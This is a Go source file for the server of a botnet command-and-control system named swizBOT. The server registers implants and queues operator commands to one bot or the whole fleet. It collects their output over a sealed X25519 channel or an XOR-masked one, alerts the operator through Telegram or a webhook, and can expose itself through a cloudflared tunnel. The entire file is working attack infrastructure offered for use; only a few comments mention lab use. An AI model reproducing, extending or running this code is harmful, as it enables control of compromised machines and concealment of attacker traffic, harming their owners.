package main

import (
	"context"
	"crypto/ecdh"
	"crypto/subtle"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"github.com/saviorSEC/swizBOT/internal/channel"
)

// version is stamped at build time via -ldflags.
var version = "1.0.0"

// Config holds server settings (flags).
type Config struct {
	UIAddr        string // operator UI/API listener
	BotAddr       string // implant listener (TLS unless Insecure)
	CertFile      string
	KeyFile       string
	Insecure      bool   // serve the implant listener over plain HTTP (lab)
	Tunnel        string // outbound tunnel: cloudflared | none
	Token         string
	BotSecret     string
	BotKey        string // hex X25519 private key; enables the sealed bot channel
	TelegramToken string
	TelegramChat  string
	WebhookURL    string
	XOR           byte
	PruneAfter    time.Duration
}

// botKey parses the configured operator key once.
func (s *Server) botKey() *ecdh.PrivateKey {
	s.keyOnce.Do(func() {
		if s.cfg.BotKey != "" {
			if k, err := channel.ParsePrivateKey(s.cfg.BotKey); err == nil {
				s.key = k
			} else {
				s.log.Printf("invalid -bot-key: %v", err)
			}
		}
	})
	return s.key
}

// Command is a queued operator task.
type Command struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Target  string `json:"target"`
}

// IsEmpty reports whether nothing is queued.
func (c Command) IsEmpty() bool { return c.ID == "" && c.Type == "" }

// Result is a completed task report from an implant.
type Result struct {
	CommandID string    `json:"command_id"`
	Output    string    `json:"output"`
	Status    string    `json:"status"`
	At        time.Time `json:"at"`
}

// Bot is the server-side view of one implant.
type Bot struct {
	ID         string    `json:"id"`
	IP         string    `json:"ip"`
	OS         string    `json:"os"`
	Arch       string    `json:"arch"`
	CryptoPub  string    `json:"crypto_pub,omitempty"` // implant X25519 public key (hex)
	FirstSeen  time.Time `json:"first_seen"`
	LastSeen   time.Time `json:"last_seen"`
	Active     bool      `json:"active"`
	Pending    *Command  `json:"pending,omitempty"`
	LastResult *Result   `json:"last_result,omitempty"`

	// delivery state machine (not serialized)
	DeliveredAt    time.Time `json:"-"`
	DeliveredCount int       `json:"-"`
}

const onlineWindow = 60 * time.Second

// Server is the C2 state machine.
type Server struct {
	cfg Config
	log *log.Logger

	mu   sync.Mutex
	bots map[string]*Bot

	key     *ecdh.PrivateKey
	keyOnce sync.Once

	paused bool // fleet-wide reversible kill switch (pause/resume)
	notify *Notifier

	wsMu      sync.Mutex
	wsClients map[*websocket.Conn]struct{}

	upgrader websocket.Upgrader
	now      func() time.Time

	cmdSeq uint64
}

// NewServer builds the C2 with the given configuration.
func NewServer(cfg Config, logger *log.Logger) *Server {
	if logger == nil {
		logger = log.New(os.Stderr, "[c2] ", log.LstdFlags)
	}
	return &Server{
		notify:    NewNotifier(cfg.TelegramToken, cfg.TelegramChat, cfg.WebhookURL, logger),
		cfg:       cfg,
		log:       logger,
		bots:      make(map[string]*Bot),
		wsClients: make(map[*websocket.Conn]struct{}),
		upgrader: websocket.Upgrader{
			CheckOrigin:     func(r *http.Request) bool { return true },
			ReadBufferSize:  4096,
			WriteBufferSize: 4096,
		},
		now: time.Now,
	}
}

func (s *Server) newCommandID() string {
	s.cmdSeq++
	return fmt.Sprintf("cmd_%d_%d", s.now().UnixNano(), s.cmdSeq)
}

// Handler returns the full HTTP routing table (operator + implant).
func (s *Server) Handler() http.Handler {
	mux := http.NewServeMux()

	// implant endpoints
	mux.HandleFunc("/checkin", s.requireBotSecret(s.handleCheckin))
	mux.HandleFunc("/result", s.requireBotSecret(s.handleResult))

	// operator endpoints (token-gated when configured)
	mux.HandleFunc("/command", s.requireOperator(s.handleCommand))
	mux.HandleFunc("/list", s.requireOperator(s.handleList))
	mux.HandleFunc("/api/bots", s.requireOperator(s.handleList))
	mux.HandleFunc("/api/command", s.requireOperator(s.handleCommand))
	mux.HandleFunc("/login", s.handleLogin)
	mux.HandleFunc("/ws", s.requireOperator(s.handleWS))
	mux.HandleFunc("/", s.handleStatic)

	return mux
}

// --- auth middleware ---------------------------------------------------

func constantEq(a, b string) bool {
	return subtle.ConstantTimeCompare([]byte(a), []byte(b)) == 1
}

func (s *Server) requireOperator(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if s.cfg.Token != "" {
			cookie, err := r.Cookie("c2_token")
			have := cookie != nil && err == nil && constantEq(cookie.Value, s.cfg.Token)
			if !have && !constantEq(r.Header.Get("X-C2-Token"), s.cfg.Token) {
				http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
				return
			}
		}
		next(w, r)
	}
}

func (s *Server) requireBotSecret(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if s.cfg.BotSecret != "" && !constantEq(r.Header.Get("X-Bot-Secret"), s.cfg.BotSecret) {
			http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
			return
		}
		next(w, r)
	}
}

// --- bot registry ------------------------------------------------------

func (s *Server) touchBot(id, osName, arch, remote string) *Bot {
	s.mu.Lock()
	defer s.mu.Unlock()
	bot, ok := s.bots[id]
	if !ok {
		bot = &Bot{ID: id, FirstSeen: s.now(), IP: remote}
		s.bots[id] = bot
		s.log.Printf("bot registered: %s (%s/%s) from %s", id, osName, arch, remote)
		if s.notify != nil {
			s.notify.Send(fmt.Sprintf("new bot: %s (%s/%s) from %s", id, osName, arch, remote))
		}
		go s.broadcastBotUpdate()
	}
	bot.OS = osName
	bot.Arch = arch
	bot.LastSeen = s.now()
	return bot
}

// deliverPending implements the delivery state machine:
//   - no pending command -> empty response
//   - undelivered -> deliver now
//   - delivered and acked via result -> cleared, empty response
//   - delivered, unacked, past the redelivery window -> redeliver (up to
//     MaxRedeliver times)
func (s *Server) deliverPending(bot *Bot) Command {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.paused {
		return Command{}
	}
	if bot.Pending == nil {
		return Command{}
	}
	p := bot.Pending
	if bot.LastResult != nil && bot.LastResult.CommandID == p.ID {
		bot.Pending = nil
		return Command{}
	}
	if bot.DeliveredAt.IsZero() {
		bot.DeliveredAt = s.now()
		s.log.Printf("delivered %s/%s to %s", p.Type, p.ID, bot.ID)
		return *p
	}
	if s.now().Sub(bot.DeliveredAt) > redeliverAfter {
		if bot.DeliveredCount >= maxRedeliver {
			s.log.Printf("dropping %s/%s for %s: no ack after %d deliveries", p.Type, p.ID, bot.ID, bot.DeliveredCount)
			bot.Pending = nil
			return Command{}
		}
		bot.DeliveredCount++
		bot.DeliveredAt = s.now()
		s.log.Printf("redelivering %s/%s to %s (delivery %d)", p.Type, p.ID, bot.ID, bot.DeliveredCount+1)
		return *p
	}
	return Command{}
}

const (
	redeliverAfter = 120 * time.Second
	maxRedeliver   = 3
)

// --- handlers ----------------------------------------------------------

func (s *Server) handleCheckin(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	botID := q.Get("bot_id")
	if botID == "" {
		http.Error(w, `{"error":"bot_id required"}`, http.StatusBadRequest)
		return
	}
	bot := s.touchBot(botID, q.Get("os"), q.Get("arch"), r.RemoteAddr)

	// register the implant public key when crypto is in use (sent every
	// checkin so the server can seal responses to this implant)
	if pub := q.Get("pub"); pub != "" && pub != bot.CryptoPub {
		s.mu.Lock()
		bot.CryptoPub = pub
		s.mu.Unlock()
	}

	s.mu.Lock()
	paused := s.paused
	s.mu.Unlock()
	if paused {
		w.Header().Set("X-Paused", "1")
	}
	cmd := s.deliverPending(bot)
	body, err := json.Marshal(cmd)
	if err != nil {
		http.Error(w, `{"error":"encode failed"}`, http.StatusInternalServerError)
		return
	}
	// sealed channel: operator key configured AND this implant registered a
	// public key -> seal the command body TO the implant key.
	if wantsCrypto(r) && bot.CryptoPub != "" {
		if key := s.botKey(); key != nil {
			if botPub, perr := channel.ParsePublicKey(bot.CryptoPub); perr == nil {
				if sealed, serr := channel.Seal(botPub, body); serr == nil {
					w.Header().Set("Content-Type", "application/octet-stream")
					w.Header().Set("X-Crypto", "aead")
					w.Write(sealed)
					return
				}
			}
			s.log.Printf("seal checkin failed for %s", botID)
		}
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(body)
}

// wantsCrypto reports whether the implant asked for the sealed channel.
func wantsCrypto(r *http.Request) bool {
	return r.Header.Get("X-Crypto") == "1" || r.Header.Get("X-Crypto") == "aead"
}

func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 4<<20))
	if err != nil {
		http.Error(w, `{"error":"read failed"}`, http.StatusBadRequest)
		return
	}
	// sealed channel: implant-sealed bodies are opened with the operator key
	if wantsCrypto(r) {
		key := s.botKey()
		if key == nil {
			http.Error(w, `{"error":"crypto requested but no -bot-key configured"}`, http.StatusBadRequest)
			return
		}
		body, err = channel.Open(key, body)
		if err != nil {
			s.log.Printf("result open failed from %s: %v", r.RemoteAddr, err)
			http.Error(w, `{"error":"crypto open failed"}`, http.StatusBadRequest)
			return
		}
	} else {
		XorMask(body, s.cfg.XOR)
	}

	var in struct {
		BotID     string `json:"bot_id"`
		CommandID string `json:"command_id"`
		Output    string `json:"output"`
		Status    string `json:"status"`
	}
	if err := json.Unmarshal(body, &in); err != nil {
		s.log.Printf("result parse failed from %s: %v", r.RemoteAddr, err)
		http.Error(w, `{"error":"bad payload"}`, http.StatusBadRequest)
		return
	}
	if in.BotID == "" {
		http.Error(w, `{"error":"bot_id required"}`, http.StatusBadRequest)
		return
	}
	res := &Result{CommandID: in.CommandID, Output: in.Output, Status: in.Status, At: s.now()}

	s.mu.Lock()
	bot, ok := s.bots[in.BotID]
	if ok {
		bot.LastSeen = s.now()
		if bot.Pending != nil && bot.Pending.ID == in.CommandID {
			bot.Pending = nil
		}
		bot.LastResult = res
	}
	s.mu.Unlock()

	if !ok {
		s.log.Printf("result from unknown bot %s (command %s)", in.BotID, in.CommandID)
	} else {
		status := res.Status
		if status == "" {
			status = "ok"
		}
		s.log.Printf("result %s [%s] from %s", in.CommandID, status, in.BotID)
		if s.notify != nil {
			s.notify.Send(fmt.Sprintf("result %s [%s] from %s: %.200s", in.CommandID, status, in.BotID, in.Output))
		}
		s.broadcastWS(wsMessage{Type: "command_result", BotID: in.BotID, CommandID: in.CommandID, Output: in.Output, Status: status})
	}
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"received"}`))
}

func (s *Server) queueCommand(botID, cmdType, payload, target string) (int, string) {
	if cmdType == "" {
		return http.StatusBadRequest, "cmd is required"
	}
	// reversible fleet kill switch: pause stops all command delivery,
	// resume re-enables it; bots keep polling so resume reaches them
	if botID == "*" && (cmdType == "pause" || cmdType == "resume") {
		s.mu.Lock()
		s.paused = cmdType == "pause"
		p := s.paused
		s.mu.Unlock()
		state := "resumed"
		if p {
			state = "paused"
		}
		s.log.Printf("fleet %s (command delivery %s)", state, map[bool]string{true: "stopped", false: "active"}[p])
		return http.StatusOK, "fleet " + state
	}
	cmd := &Command{ID: s.newCommandID(), Type: cmdType, Payload: payload, Target: target}
	s.mu.Lock()
	defer s.mu.Unlock()

	if botID == "*" {
		if len(s.bots) == 0 {
			return http.StatusNotFound, "no bots known yet"
		}
		for _, b := range s.bots {
			b.Pending = cmd
			b.DeliveredAt = time.Time{}
			b.DeliveredCount = 0
		}
		s.log.Printf("queued %s/%s for all %d bots", cmdType, cmd.ID, len(s.bots))
		return http.StatusOK, fmt.Sprintf("queued for %d bots", len(s.bots))
	}

	bot, ok := s.bots[botID]
	if !ok {
		return http.StatusNotFound, "bot not found: " + botID
	}
	bot.Pending = cmd
	bot.DeliveredAt = time.Time{}
	bot.DeliveredCount = 0
	s.log.Printf("queued %s/%s for %s", cmdType, cmd.ID, botID)
	return http.StatusOK, "queued"
}

func (s *Server) handleCommand(w http.ResponseWriter, r *http.Request) {
	botID, cmdType, payload, target, err := parseCommandRequest(r)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
		return
	}
	code, msg := s.queueCommand(botID, cmdType, payload, target)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"status": map[bool]string{true: "queued", false: "error"}[code == http.StatusOK], "message": msg})
}

func parseCommandRequest(r *http.Request) (botID, cmdType, payload, target string, err error) {
	botID = r.URL.Query().Get("bot_id")
	cmdType = r.URL.Query().Get("cmd")
	payload = r.URL.Query().Get("payload")
	target = r.URL.Query().Get("target")

	if botID == "" && r.Method == http.MethodPost {
		ct := r.Header.Get("Content-Type")
		body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		trimmed := strings.TrimSpace(string(body))
		if strings.HasPrefix(trimmed, "{") &&
			(ct == "" || strings.Contains(ct, "json")) {
			var b struct {
				BotID   string `json:"bot_id"`
				Type    string `json:"type"`
				Cmd     string `json:"cmd"`
				Payload string `json:"payload"`
				Target  string `json:"target"`
			}
			if err := json.Unmarshal(body, &b); err != nil {
				return "", "", "", "", fmt.Errorf("bad json body")
			}
			if b.Type == "" {
				b.Type = b.Cmd
			}
			return b.BotID, b.Type, b.Payload, b.Target, nil
		}
		vals, perr := url.ParseQuery(string(body))
		if perr == nil {
			if v := vals.Get("bot_id"); v != "" {
				botID = v
			}
			if v := vals.Get("cmd"); v != "" {
				cmdType = v
			}
			if v := vals.Get("payload"); v != "" {
				payload = v
			}
			if v := vals.Get("target"); v != "" {
				target = v
			}
		}
	}
	if botID == "" {
		return "", "", "", "", fmt.Errorf("bot_id required")
	}
	return botID, cmdType, payload, target, nil
}

func (s *Server) snapshot() []*Bot {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]*Bot, 0, len(s.bots))
	for _, b := range s.bots {
		cp := *b
		cp.Active = s.now().Sub(b.LastSeen) < onlineWindow
		out = append(out, &cp)
	}
	return out
}

func (s *Server) handleList(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s.snapshot())
}

func (s *Server) handleLogin(w http.ResponseWriter, r *http.Request) {
	if s.cfg.Token == "" {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}
	got := r.URL.Query().Get("token")
	if !constantEq(got, s.cfg.Token) {
		http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
		return
	}
	http.SetCookie(w, &http.Cookie{Name: "c2_token", Value: s.cfg.Token, Path: "/", HttpOnly: true, SameSite: http.SameSiteLaxMode})
	http.Redirect(w, r, "/", http.StatusFound)
}

// --- WebSocket ---------------------------------------------------------

type wsMessage struct {
	Type      string `json:"type"`
	BotID     string `json:"bot_id,omitempty"`
	CommandID string `json:"command_id,omitempty"`
	Output    string `json:"output,omitempty"`
	Status    string `json:"status,omitempty"`
	Bots      []*Bot `json:"bots,omitempty"`
}

func (s *Server) broadcastWS(msg wsMessage) {
	s.wsMu.Lock()
	defer s.wsMu.Unlock()
	for c := range s.wsClients {
		if err := c.WriteJSON(msg); err != nil {
			c.Close()
			delete(s.wsClients, c)
		}
	}
}

func (s *Server) broadcastBotUpdate() {
	s.broadcastWS(wsMessage{Type: "bot_update", Bots: s.snapshot()})
}

func (s *Server) handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	s.wsMu.Lock()
	s.wsClients[conn] = struct{}{}
	s.wsMu.Unlock()
	defer func() {
		s.wsMu.Lock()
		delete(s.wsClients, conn)
		s.wsMu.Unlock()
	}()

	s.broadcastBotUpdate() // initial snapshot via normal broadcast path

	// read loop: detect disconnect and drain pings
	conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		return nil
	})
	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			return
		}
	}
}

// --- pruning -----------------------------------------------------------

func (s *Server) pruneLoop(ctx context.Context) {
	if s.cfg.PruneAfter <= 0 {
		return
	}
	ticker := time.NewTicker(time.Hour)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			s.mu.Lock()
			for id, b := range s.bots {
				if s.now().Sub(b.LastSeen) > s.cfg.PruneAfter {
					delete(s.bots, id)
					s.log.Printf("pruned stale bot %s", id)
				}
			}
			s.mu.Unlock()
		}
	}
}

// --- helpers -----------------------------------------------------------

// XorMask applies the single-byte obfuscation mask (shared with bot).
func XorMask(data []byte, key byte) {
	for i := range data {
		data[i] ^= key
	}
}

func listenAndServe(listenAddr, certFile, keyFile string, insecure bool, h http.Handler, logf func(string, ...interface{})) error {
	if insecure {
		logf("implant listener on http://%s (insecure lab mode)", listenAddr)
		return http.ListenAndServe(listenAddr, h)
	}
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return fmt.Errorf("load TLS keypair (%s, %s): %w -- generate with: openssl req -x509 -newkey rsa:4096 -keyout %s -out %s -days 365 -nodes -subj '/CN=localhost'",
			certFile, keyFile, err, keyFile, certFile)
	}
	logf("implant listener on https://%s", listenAddr)
	tlsCfg := &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
	srv := &http.Server{Addr: listenAddr, Handler: h, TLSConfig: tlsCfg}
	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		return err
	}
	return srv.Serve(tls.NewListener(ln, tlsCfg))
}

// Main wires flags, listeners, tunnel and shutdown.
func main() {
	cfg, err := parseFlags()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(2)
	}
	logger := log.New(os.Stderr, "[c2] ", log.LstdFlags)
	logger.Printf("swizBOT C2 %s starting", version)

	s := NewServer(cfg, logger)
	h := s.Handler()

	// tunnel to the operator/API listener (same handler serves bot routes)
	var tunnelCmd *exec.Cmd
	if cfg.Tunnel == "cloudflared" {
		tunnelCmd = startCloudflared(cfg.UIAddr, logger)
	}

	uiErr := make(chan error, 1)
	go func() {
		logger.Printf("operator UI/API on http://%s", cfg.UIAddr)
		uiErr <- http.ListenAndServe(cfg.UIAddr, h)
	}()

	botErr := make(chan error, 1)
	go func() {
		botErr <- listenAndServe(cfg.BotAddr, cfg.CertFile, cfg.KeyFile, cfg.Insecure, h, logger.Printf)
	}()

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	go s.pruneLoop(ctx)

	select {
	case <-ctx.Done():
		logger.Printf("shutting down")
	case err := <-uiErr:
		if err != nil {
			logger.Printf("operator listener failed: %v", err)
		}
	case err := <-botErr:
		if err != nil {
			logger.Printf("implant listener failed: %v", err)
		}
	}
	if tunnelCmd != nil && tunnelCmd.Process != nil {
		_ = tunnelCmd.Process.Kill()
	}
}

// startCloudflared spawns a cloudflared quick tunnel in front of addr and
// prints the public URL once it is up. The quick tunnel terminates TLS at
// the Cloudflare edge, so the public URL is https even when the origin is
// plain HTTP. Bots configured with SWIZ_C2_URLS=https://<rand>.trycloudflare.com
// reach the same handler (checkin/result/dashboard) through the tunnel.
func startCloudflared(addr string, logger *log.Logger) *exec.Cmd {
	cmd := exec.Command("cloudflared", "tunnel", "--url", "http://127.0.0.1"+addr, "--no-autoupdate")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		logger.Printf("tunnel: cloudflared: %v", err)
		return nil
	}
	if err := cmd.Start(); err != nil {
		logger.Printf("tunnel: cloudflared not available: %v", err)
		return nil
	}
	re := regexp.MustCompile(`https://[a-z0-9-]+\.trycloudflare\.com`)
	deadline := time.Now().Add(25 * time.Second)
	buf := make([]byte, 0, 4096)
	chunk := make([]byte, 256)
	for time.Now().Before(deadline) {
		n, rerr := stdout.Read(chunk)
		buf = append(buf, chunk[:n]...)
		if m := re.Find(buf); m != nil {
			logger.Printf("tunnel: public URL: %s", m)
			logger.Printf("tunnel: set SWIZ_C2_URLS=%s on implants; dashboard/API at the same URL", m)
			return cmd
		}
		if rerr != nil {
			break
		}
	}
	logger.Printf("tunnel: cloudflared URL not detected yet; check `cloudflared tunnel` output")
	return cmd
}

func parseFlags() (Config, error) {
	var cfg Config
	flag.StringVar(&cfg.UIAddr, "ui", ":8080", "operator UI/API listen address")
	flag.StringVar(&cfg.BotAddr, "listen", ":8443", "implant listen address (TLS unless -insecure)")
	flag.StringVar(&cfg.CertFile, "cert", "server.crt", "TLS certificate path")
	flag.StringVar(&cfg.KeyFile, "key", "server.key", "TLS private key path")
	flag.BoolVar(&cfg.Insecure, "insecure", false, "serve the implant listener over plain HTTP (lab use only)")
	flag.StringVar(&cfg.Tunnel, "tunnel", "none", "outbound tunnel: cloudflared | none (quick tunnel in front of -ui)")
	flag.StringVar(&cfg.Token, "token", "", "operator token for UI/API/WS (empty disables auth)")
	flag.StringVar(&cfg.BotSecret, "bot-secret", "", "shared secret required from implants (empty disables)")
	flag.StringVar(&cfg.BotKey, "bot-key", "", "operator X25519 private key (hex); enables the sealed bot channel")
	flag.StringVar(&cfg.TelegramToken, "notify-telegram-token", "", "Telegram bot token for operator alerts")
	flag.StringVar(&cfg.TelegramChat, "notify-telegram-chat", "", "Telegram chat id for operator alerts")
	flag.StringVar(&cfg.WebhookURL, "notify-webhook", "", "Discord-style webhook URL for operator alerts")
	genKey := flag.Bool("bot-key-gen", false, "generate an operator X25519 keypair and exit")
	xorHex := flag.String("xor", "0xaa", "result obfuscation byte (hex), must match the implant SWIZ_XOR")
	pruneHours := flag.Int("prune-hours", 24, "drop bots unseen for this many hours (0 disables)")
	flag.Parse()

	if *genKey {
		privHex, pubHex, err := channel.GeneratePrivateKey()
		if err != nil {
			return cfg, fmt.Errorf("keygen: %w", err)
		}
		fmt.Println("operator private key (-bot-key):", privHex)
		fmt.Println("operator public  key (SWIZ_C2_PUBKEY):", pubHex)
		os.Exit(0)
	}

	if n, err := strconv.ParseUint(strings.TrimPrefix(*xorHex, "0x"), 16, 8); err == nil {
		cfg.XOR = byte(n)
	} else {
		return cfg, fmt.Errorf("invalid -xor %q", *xorHex)
	}
	cfg.PruneAfter = time.Duration(*pruneHours) * time.Hour
	return cfg, nil
}
